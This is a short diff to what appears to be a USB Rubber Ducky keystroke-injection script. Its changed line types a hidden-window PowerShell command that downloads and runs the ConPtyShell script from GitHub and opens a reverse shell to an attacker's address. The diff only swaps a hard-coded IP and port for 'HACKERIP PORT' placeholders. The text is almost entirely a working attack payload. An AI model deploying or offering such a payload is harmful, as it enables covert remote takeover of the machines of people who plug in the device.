@@ -29,7 +29,7 @@ DELAY 200
 STRING cmd
 ENTER
 DELAY 200
-STRING PowerShell.exe -windowstyle hidden IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.43.167 1234
+STRING PowerShell.exe -windowstyle hidden IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell HACKERIP PORT
 ENTER
 DELAY 100
 ALT TAB
